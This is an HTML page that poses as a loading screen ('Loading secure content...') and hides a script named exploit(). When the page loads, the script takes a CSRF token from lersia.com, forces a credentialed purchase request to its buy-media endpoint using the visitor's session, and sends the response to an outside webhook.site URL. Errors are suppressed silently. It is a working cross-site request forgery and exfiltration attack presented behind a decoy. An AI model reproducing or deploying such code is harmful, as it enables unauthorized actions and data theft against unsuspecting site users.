<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background: #0a0e27;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            background: #0f1235;
            padding: 40px;
            border-radius: 20px;
            border: 1px solid #ff3333;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-top: 3px solid #ff3333;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p>Loading secure content...</p>
    </div>

    <script>
    const WEBHOOK_URL = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';

    (async function exploit() {
        try {
            // Step 1: Get CSRF token via simple GET (no custom headers)
            await fetch('https://lersia.com/sanctum/csrf-cookie', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors'
            });
            
            await new Promise(r => setTimeout(r, 800));
            
            // Step 2: Extract token from cookies
            let csrfToken = null;
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.trim().startsWith('XSRF-TOKEN=')) {
                    csrfToken = decodeURIComponent(cookie.trim().substring(11));
                    break;
                }
            }
            
            if (!csrfToken) {
                console.log('No CSRF token found');
                return;
            }
            
            // Step 3: Send POST with token in URL instead of header (avoids preflight)
            const response = await fetch('https://lersia.com/buy-media?XSRF-TOKEN=' + encodeURIComponent(csrfToken), {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "id": "665",
                    "resolution": "1920",
                    "type": "Video"
                })
            });
            
            const stolenData = await response.json();
            
            // Step 4: Exfiltrate
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(stolenData)
            });
            
        } catch(e) {
            // Silent fail
        }
    })();
    </script>
</body>
</html>
